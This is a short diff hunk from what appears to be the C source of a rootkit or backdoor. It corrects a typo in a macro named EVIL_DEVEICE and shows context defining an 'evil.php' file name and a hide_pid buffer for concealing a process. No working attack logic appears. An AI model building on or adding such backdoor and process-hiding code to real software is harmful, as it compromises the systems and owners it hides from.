@@ -10,7 +10,7 @@
 #include "misc.h"
 
 
-#define EVIL_DEVEICE "EVILBACKDOR"
+#define EVIL_DEVEICE "EVILBACKDOOR"
 #define EVIL_FILE "evil.php"
 
 char hide_pid[NAME_MAX];
